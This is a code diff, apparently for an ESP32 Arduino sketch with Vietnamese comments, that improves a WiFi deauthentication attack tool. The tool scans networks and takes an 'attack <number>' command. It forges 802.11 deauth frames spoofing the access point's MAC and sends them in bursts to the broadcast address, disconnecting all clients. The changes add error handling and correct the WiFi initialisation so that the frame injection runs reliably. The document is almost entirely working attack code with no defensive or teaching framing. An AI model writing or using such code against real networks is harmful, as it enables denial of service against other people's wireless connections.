@@ -24,21 +24,29 @@ struct Network {
 Network networks[20]; // Giới hạn 20 mạng để tránh tràn bộ nhớ
 int networkCount = 0;
 
-// Hàm gửi gói tin deauth (đã sửa để dùng hai tham số)
+// Hàm gửi gói tin deauth
 void sendDeauthFrame(uint8_t* apMac, uint8_t* stationMac, uint8_t channel) {
+  // Cập nhật MAC vào gói tin
   memcpy(&deauthFrame[4], stationMac, 6);  // MAC đích
   memcpy(&deauthFrame[10], apMac, 6);      // MAC nguồn
   memcpy(&deauthFrame[16], apMac, 6);      // BSSID
 
   // Đặt kênh WiFi với tham số thứ hai là WIFI_SECOND_CHAN_NONE
-  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  if (err != ESP_OK) {
+    Serial.println("Lỗi khi đặt kênh WiFi!");
+    return;
+  }
 
   // Gửi 10 gói tin deauth
   for (int i = 0; i < 10; i++) {
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
+    if (result != ESP_OK) {
+      Serial.println("Lỗi khi gửi gói tin!");
+    }
     delay(10);
   }
-  Serial.println("Đã gửi gói Deauth");
+  Serial.println("Đã gửi gói Deauth thành công!");
 }
 
 // Hàm chuyển chuỗi BSSID thành mảng byte
@@ -91,10 +99,18 @@ void setup() {
   Serial.println("Lệnh: scan | attack <số thứ tự>");
   Serial.println("Ví dụ: scan | attack 1");
 
-  // Khởi tạo WiFi
-  WiFi.mode(WIFI_AP_STA);
-  esp_wifi_init(NULL);
-  esp_wifi_set_promiscuous(true); // Bật chế độ bắt gói tin
+  // Khởi tạo WiFi với cấu hình chi tiết
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_err_t err = esp_wifi_init(&cfg);
+  if (err != ESP_OK) {
+    Serial.println("Lỗi khởi tạo WiFi!");
+    return;
+  }
+
+  // Đặt chế độ AP + STA và bật promiscuous mode
+  esp_wifi_set_mode(WIFI_MODE_APSTA);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_start();
 }
 
 void loop() {
@@ -124,7 +140,7 @@ void loop() {
       Serial.print(", Kênh: ");
       Serial.print(networks[index].channel);
       Serial.println(")");
-      
+
       sendDeauthFrame(networks[index].bssidBytes, broadcastMac, networks[index].channel);
     } else {
       Serial.println("Lệnh không xác định! Dùng: scan | attack <số thứ tự>");
